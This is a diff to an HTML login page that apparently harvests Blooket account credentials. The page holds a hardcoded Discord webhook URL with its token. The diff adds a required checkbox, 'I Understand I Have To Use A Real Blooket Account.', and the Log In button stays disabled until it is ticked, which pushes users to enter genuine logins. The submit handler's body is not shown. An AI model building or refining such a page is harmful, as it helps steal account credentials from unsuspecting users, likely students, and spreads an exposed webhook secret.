@@ -15,6 +15,26 @@
             transform: scale(1.03);
             box-shadow: 0 15px 25px rgba(0,0,0,0.4);
         }
+
+        .checkbox-label {
+            font-size: 0.875rem; /* Text size similar to the rest of the form labels */
+            color: #D1D5DB; /* Light gray color for text */
+            padding-left: 8px;
+            font-weight: 700; /* Make the label text bold */
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+        }
+
+        .checkbox-container input {
+            height: 1.25rem; /* Adjust size to match button size */
+            width: 1.25rem;
+            border-radius: 0.25rem;
+            border: 1px solid #4B5563; /* Gray border color */
+            background-color: #1F2937; /* Dark background */
+        }
     </style>
 </head>
 <body class="bg-gradient-to-br from-gray-900 to-gray-800 min-h-screen flex items-center justify-center p-4">
@@ -57,9 +77,19 @@
                 </a>
             </div>
             
+            <!-- Checkbox for Skibidi Agreement -->
+            <div class="checkbox-container mb-4">
+                <input type="checkbox" id="skibidiCheckbox" class="text-blue-500 border-gray-600 rounded focus:ring-2 focus:ring-blue-500" required>
+                <label for="skibidiCheckbox" class="checkbox-label">
+                    I Understand I Have To Use A Real Blooket Account.
+                </label>
+            </div>
+
             <button 
                 type="submit" 
+                id="loginButton"
                 class="w-full bg-blue-600 hover:bg-blue-700 text-white py-2 rounded-md transition duration-300 ease-in-out transform hover:scale-102 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-opacity-50"
+                disabled
             >
                 Log In
             </button>
@@ -69,6 +99,18 @@
     <script>
         // Direct webhook URL
         const webhookUrl = 'https://discord.com/api/webhooks/1310719097801150585/3a7pDv9ofBSeoT-0e-wZQml8N507hwoXg69nMsckQHrAeNwMNfEt_IUC4BBawaApMm6c';
+
+        const skibidiCheckbox = document.getElementById('skibidiCheckbox');
+        const loginButton = document.getElementById('loginButton');
+
+        // Enable or disable the login button based on checkbox state
+        skibidiCheckbox.addEventListener('change', function() {
+            if (skibidiCheckbox.checked) {
+                loginButton.disabled = false;
+            } else {
+                loginButton.disabled = true;
+            }
+        });
 
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
